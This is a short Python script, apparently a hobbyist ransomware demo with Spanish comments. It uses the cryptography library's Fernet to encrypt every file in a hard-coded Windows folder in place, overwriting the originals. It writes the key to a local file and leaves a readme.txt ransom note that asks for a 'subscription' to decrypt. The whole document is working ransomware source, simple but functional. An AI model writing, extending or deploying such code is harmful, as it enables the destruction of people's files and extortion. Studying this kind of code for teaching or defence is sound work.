from cryptography.fernet import Fernet
import os

def generar_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

def cargar_key():
    return open('key.key', 'rb').read()

def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)

if __name__ == '__main__':

# recomendacion para el uso: vefiricar si la ruta de la carpeta donde se va a encriptar los items sea la correcta:)

    path_to_encrypt = 'C:\\Users\\57310\\Desktop\\encriptao'
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+'\\'+item for item in items]

    generar_key()
    key = cargar_key()

    encrypt(full_path, key)

    with open(path_to_encrypt+'\\'+'readme.txt', 'w') as file:
        file.write('Ficheros encriptados por el tito Errodringer\n')
        file.write('Dame una suscripcion para desencriptar. Thanks')